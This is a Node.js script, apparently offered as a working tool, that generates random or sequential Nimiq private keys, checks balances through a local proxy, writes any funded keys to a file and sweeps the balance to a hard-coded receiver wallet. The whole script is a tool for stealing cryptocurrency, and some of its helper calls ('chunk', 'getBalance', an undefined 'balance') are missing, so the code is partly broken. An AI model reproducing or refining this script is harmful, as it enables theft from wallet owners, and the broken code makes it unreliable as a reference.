const fs = require('fs');
const cluster = require('cluster');
const { default: axios } = require('axios');
const utils = require('./utils');
const startServer = require('./webserver');
const Web3 = require('./web3');
const { generateRandomPrivateKey, delay, splitRange, fromPrivateKey } = utils;

(async () => {
  // Main
  const startClient = async () => {
    if (cluster.isMaster) {
      // Config
      console.info(`\x1b[32mConnecting To Nimiq Network...\x1b[0m`);

      const config = {
        "start": "1",
        "end": "fffffffffffffffffffffffffff",
        "wallet": "NQ08 SUEH T0GS PCDJ HUNX Q50H B0M0 ABHA PP03",
        "threads": 1,
        "mode": "random"
      };
      const numCPUs = config.threads || 4;
      const mode = config.mode || 'sequential';
      const receiver = config.wallet || "NQ08 SUEH T0GS PCDJ HUNX Q50H B0M0 ABHA PP03";

      console.info(`\x1b[32mConnected To Nimiq Network...\x1b[0m`);

      // Var
      let total = 0;
      let founds = 0;
      const start = "0".repeat(64 - config.start.length) + config.start;
      const end = "0".repeat(64 - config.end.length) + config.end;
      const ranges = splitRange(`0x${start}`, `0x${end}`, numCPUs);

      // Payout
      const send = async (privateKey) => {
        const node = new Web3('ws://127.0.0.1:8088/proxy');

        try {
          const res = await node.send(config.wallet, privateKey)
          node.close();
          return res;
        } catch (error) {
          node.close();
          return null;
        }
      }

      cluster.on('message', async (worker, msg) => {
        const uid = `CPU${worker.id.toString().padStart(numCPUs.toString().length + 1, "0")}`
      
        const { wallets } = msg;
        wallets.forEach(async(w) => {
          const { address, balance, privateKey, baseKey } = w;
          total++;
          if (balance > 0) {
            founds++;
            console.info(`\x1b[32m${uid}`, `\x1b[32m| Checked: ${total} | Founds: ${founds} | ${address} | B:${balance} NIM`, '\x1b[34m', `>  ${privateKey}\x1b[0m`);
  
            // Write to file
            var successString = `Wallet: [${address}]\nPrivate: [${privateKey}]\nBalance: ${balance} NIM\n\n------ Malphite Coder ------\n\n`;
            fs.appendFileSync('./match-nimiq-private.txt', successString, (err) => console.error(err));
  
            // Create transaction to main wallet
            await send(privateKey)
          } else {
            console.info(`\x1b[32m${uid}`, `\x1b[31m| Checked: ${total} | Founds: ${founds} | ${address} | B:${balance} NIM`, '\x1b[34m', `>  ${baseKey}\x1b[0m`);
          }
        })
      })

      for (let i = 0; i < numCPUs; i++) {
        const [rangeStart, rangeEnd] = ranges[i];
        cluster.fork({ START_KEY: `0x${rangeStart}`, END_KEY: `0x${rangeEnd}`, MODE: mode });
      }

      cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} died`);
      });
    } else {
      const node = new Web3('ws://127.0.0.1:8088/proxy');

      const getBalances = async (wallets) => {
        const addresses = wallets.map((o) => o.address);
        const chunksAddresses = chunk(addresses, 500);
        const result = await Promise.all(chunksAddresses.map(async (addrs) => {
          return await node.getBalances(addrs)
        }));
        const balances = result.reduce((a, b) => ({ ...a, ...b }), {});
        return wallets.map((item) => ({ ...item, balance: balances[item.address] }));
      }


      const START_KEY = BigInt(process.env.START_KEY);
      const END_KEY = BigInt(process.env.END_KEY);
      const MODE = process.env.MODE;
      const BATCH_SIZE = 20;

      if (MODE === 'sequential') {
        for (let key = START_KEY; key <= END_KEY; key++) {
          const privateKey = key.toString(16).padStart(64, '0');
          const wallet = fromPrivateKey(privateKey)
          const address = wallet.getAddress();
          const balance = await getBalance(address);
          process.send({ address, privateKey, balance, baseKey: key.toString(16) })
        }
      } else {
        const min = process.env.START_KEY;
        const max = process.env.END_KEY;

        const generateWallet = async (min, max) => new Promise((resolve) => {
          const baseKey = generateRandomPrivateKey(min, max);
          const privateKeyHex = baseKey.padStart(64, '0');
          const wallet = fromPrivateKey(privateKeyHex);
          const address = wallet.getAddress();
          resolve({ address, privateKey: privateKeyHex, balance, baseKey: baseKey });
        })
        const processBatch = async () => {
          const promises = Array(BATCH_SIZE).fill(0).map(() => generateWallet(min, max));
          const wallets = await Promise.all(promises);
          const walletsWithBalances = await getBalances(wallets);
          
          process.send({ wallets: walletsWithBalances });
          // for (let i = 0; i < BATCH_SIZE; i++) {
          //   const baseKey = generateRandomPrivateKey(min, max);
          //   const privateKeyHex = baseKey.padStart(64, '0');
          //   const wallet = fromPrivateKey(privateKeyHex);
          //   const address = wallet.getAddress();
          //   promises.push({ address, privateKey: privateKeyHex, balance, baseKey: baseKey });
          // }
        };

        const run = async () => {
          while (true) {
            await processBatch();
          }
        };

        run().catch(console.error);
      }
    }
  }

  startServer()
    .then(() => {
      startClient();
    })
    .catch((e) => {
      console.log(`[Error]: ${e.message}`);
    })
})()
